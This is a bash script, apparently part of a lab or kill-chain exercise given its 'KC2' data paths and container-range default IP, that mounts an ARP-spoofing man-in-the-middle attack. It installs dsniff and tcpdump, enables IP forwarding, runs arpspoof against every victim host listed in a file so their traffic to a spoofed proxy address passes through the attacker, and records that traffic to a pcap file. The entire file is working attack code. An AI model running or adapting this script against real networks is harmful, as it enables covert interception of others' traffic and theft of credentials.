#!/usr/bin/env bash
set -euo pipefail

SPOOFED="${1:-${FRONTEND_PROXY_IP:-172.18.0.200}}"
INPUT_FILE="${2:-$DATA_PATH/KC2/iphost}"
TCPDUMP_OUT="${3:-$DATA_PATH/KC2/node_traffic}"
TCPDUMP_LOG="${4:-$DATA_PATH/KC2/tcpdump_stdout_err.log}"
NAME="${5:-${ARP_VICTIM:-proxy}}"
PIDFILE="${6:-$DATA_PATH/KC2/arp_pids}"

if [[ -z "${INPUT_FILE}" || ! -f "${INPUT_FILE}" ]]; then
  echo "No IP file" >&2
  exit 1
fi

# Installing dependencies
apt-get update >/dev/null 2>&1
apt-get install -y --no-install-recommends \
  bash iproute2 gawk procps util-linux tcpdump dsniff coreutils ca-certificates >/dev/null 2>&1

# Extraction of all the IPs (first column of the file) - no duplications
mapfile -t VICTIMS < <(awk -F' - ' -v NAME="$NAME" '$2 ~ NAME { print $1 }' "$INPUT_FILE" | sort -u)
if [[ "${#VICTIMS[@]}" -eq 0 ]]; then
  echo "No victim found (Host having $NAME in the name). Using all the network as victim" >&2
  mapfile -t VICTIMS < <(awk -F' - ' '{print $1}' "${INPUT_FILE}" | sort -u)
  if [[ "${#VICTIMS[@]}" -eq 0 ]]; then
    echo "ERROR: no worker found" >&2
    exit 1
  fi
fi

# Interface used to reach spoofed host
IFACE="$(ip -o route get "${SPOOFED}" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i=="dev") {print $(i+1); exit}}')"
IFACE="${IFACE:-eth0}"

echo "[*] Spoofed       : ${SPOOFED}"
echo "[*] Victims       : ${VICTIMS[*]}"
echo "[*] Interface     : ${IFACE}"

# Enabling IP forwarding to not interrupting the traffic
echo "[*] Enabling IPv4 forwarding"
sysctl -w net.ipv4.ip_forward=1 >/dev/null

if pgrep -f "tcpdump .* ${SPOOFED}" >/dev/null 2>&1; then
  echo "[*] tcpdump already in execution for ${SPOOFED} (no actions)"
else
  echo "[*] Running tcpdump outside shell: ${TCPDUMP_OUT}"
  setsid tcpdump -i "${IFACE}" -n host "${SPOOFED}" -w "${TCPDUMP_OUT}" \
      >"${TCPDUMP_LOG}" 2>&1 < /dev/null &
  sleep 1
fi

# Run ARP spoof for all the victims
PIDS=()

echo "[*] Execution arpspoof to nodes for spoofed ${SPOOFED}"
for NODE in "${VICTIMS[@]}"; do
  echo "    - node ${NODE}"
  setsid arpspoof -i "${IFACE}" -t "${NODE}" "${SPOOFED}" >/dev/null 2>&1 < /dev/null &
  PIDS+=("$!")
done

for pid in "${PIDS[@]}"; do
  printf '%s\n' "$pid" >> "$PIDFILE"
done

echo
echo "[*] MITM on"
echo "    - pcap: ${TCPDUMP_OUT}"
echo "    - log tcpdump: ${TCPDUMP_LOG}"
echo
